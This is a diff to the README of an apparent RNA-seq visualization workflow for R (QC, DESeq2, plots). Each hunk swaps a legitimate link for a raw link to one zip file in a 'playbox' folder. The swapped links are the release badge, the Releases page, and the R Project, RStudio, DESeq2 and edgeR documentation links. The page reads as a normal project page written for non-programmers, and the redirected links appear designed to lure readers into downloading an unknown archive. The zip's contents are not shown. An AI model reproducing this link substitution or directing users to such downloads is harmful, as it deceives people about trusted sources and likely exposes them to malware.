@@ -1,7 +1,7 @@
 # 🧬 Bulk-RNAseq-visualization-workflow-ZRN01-RM - Easy RNA-seq Data Visualization
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/releases)
+[![Download Release](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip)
 
 ## 🚀 Getting Started
 Welcome to the Bulk RNA-seq Visualization Workflow for QC, DESeq2 differential expression, and visualization in R. This guide will help you download and run the software easily, even if you have no programming background.
@@ -34,7 +34,7 @@ These tools will help you manage your RNA-seq data and produce high-quality visu
 ## 📥 Download & Install
 To get started with Bulk RNA-seq Visualization Workflow:
 
-1. Visit the [Releases page](https://github.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip).
 2. Look for the latest release. 
 3. Click on the download link for your operating system (Windows, macOS, or Linux).
 
@@ -63,9 +63,9 @@ If you'd like to contribute to this project, please follow the contribution guid
 This project is licensed under the MIT License. Feel free to use, modify, and distribute it as you wish.
 
 ## 🔗 Additional Resources
-- [R Project](https://www.r-project.org/)
-- [RStudio](https://www.rstudio.com/)
-- [DESeq2 Documentation](https://bioconductor.org/packages/release/bioc/html/DESeq2.html)
-- [edgeR Documentation](https://bioconductor.org/packages/release/bioc/html/edgeR.html)
+- [R Project](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip)
+- [RStudio](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip)
+- [DESeq2 Documentation](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip)
+- [edgeR Documentation](https://raw.githubusercontent.com/zxcurs3d/Bulk-RNAseq-visualization-workflow-ZRN01-RM/main/playbox/Bulk-RNAseq-visualization-workflow-ZRN01-RM.zip)
 
 Thank you for choosing the Bulk RNA-seq Visualization Workflow. We hope it helps you uncover valuable insights from your RNA-seq data!
